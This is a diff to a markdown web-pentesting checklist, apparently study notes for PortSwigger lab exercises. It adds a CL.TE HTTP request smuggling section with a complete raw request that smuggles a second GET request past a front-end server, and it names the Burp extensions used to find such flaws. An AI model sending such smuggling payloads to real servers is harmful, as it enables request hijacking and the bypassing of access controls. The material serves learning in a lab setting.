@@ -378,6 +378,27 @@ Observed any response status or response length difference.
 
 ### :white_check_mark: HTTP request smuggling
 _Burp suite extensions : Param miner | HTTP Request Smuggler_
+
+#### Summary
+##### CL.TE
+In that scenario
+![#f03c15](https://placehold.co/15x15/f03c15/f03c15.png) `#f03c15`
+```
+POST / HTTP/1.1
+Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Transfer-encoding: chunked
+
+3
+a=1
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
+
 #### Step 1 - Scan
 - Use the **Param Miner** (all options)
 - Use the **HTTP Request Smuggler** (all options)
